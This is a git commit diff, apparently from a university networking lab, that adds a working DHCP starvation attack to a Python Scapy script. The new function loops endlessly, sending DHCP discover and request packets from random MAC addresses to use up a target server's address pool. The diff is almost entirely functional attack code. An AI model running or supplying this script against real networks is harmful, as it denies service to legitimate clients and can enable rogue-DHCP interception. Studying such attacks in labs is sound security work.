497d46d3e2c5d6cd77bd01914d5ad015d06a0a11
Meir-Crombie <meircrombie@gmail.com>
2025-12-09 16:13:32 +0200

    feat: implement DHCP starvation attack functionality in main.py

--- Labs/Lab 4/main.py
+++ Labs/Lab 4/main.py
@@ -16,9 +16,52 @@ def get_dhcp_server_ip(iface):
     if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 2: 
         return pkt[IP].src
     return None
+def attack_dhcp_server(iface, target_ip):
+  print(f"Starting DHCP Starvation Attack on {target_ip} ...")
+  while True: 
+    mac = RandMAC()
+    pkt_discover = (
+        Ether(src=mac, dst="FF:FF:FF:FF:FF:FF") /
+        IP(src='0.0.0.0',dst='255.255.255.255') / 
+        UDP(sport=68,dport=67) / 
+        BOOTP(chaddr=mac) / 
+        DHCP(options=[('message-type','discover'),'end'])
+    )
+    sendp(pkt_discover, iface=iface, verbose=0)
+    offer_pkt = sniff(filter="udp and (port 67 or 68)", count=1, iface=iface, timeout=5)
+    if offer_pkt:
+        
+        ans = offer_pkt[0]
+        offered_ip = ans[BOOTP].yiaddr
+        print(f"Requested IP: {offered_ip} with MAC: {mac}")
+        pkt_request = (
+            Ether(src=mac, dst="FF:FF:FF:FF:FF:FF") /
+            IP(src='0.0.0.0',dst=target_ip) / 
+            UDP(sport=68,dport=67) /
+            BOOTP(chaddr=mac) / 
+            DHCP(options=[('message-type','request'),
+                ('requested_addr', offered_ip),
+                ('server_id', target_ip),
+                'end'])   
+        )             
+        sendp(pkt_request, iface=iface, verbose=0)                
+
+
 
 def main():
-    argv_parser = argparse.ArgumentParser('DHCP Starvation')
+    argv_parser = argparse.ArgumentParser("""
+usage: DHCPStarvationNEW.py [-h] [-i IFACE] [-t TARGET]
+
+DHCP Starvation
+
+optional arguments:
+    -h, --help show this help message and exit
+    -i IFACE, --iface IFACE
+                Interface you wish to use
+    -t TARGET, --target TARGET
+                IP of target server
+    """)
+
     argv_parser.add_argument(
         '-i', '--iface',
         help='Interface you wish to use',
@@ -43,5 +86,5 @@ def main():
         exit(0) 
 
     print(f"Checking: IFACE: {iface} | Target IP: {tar_ip}")
-
+    attack_dhcp_server(iface, tar_ip)
 main()
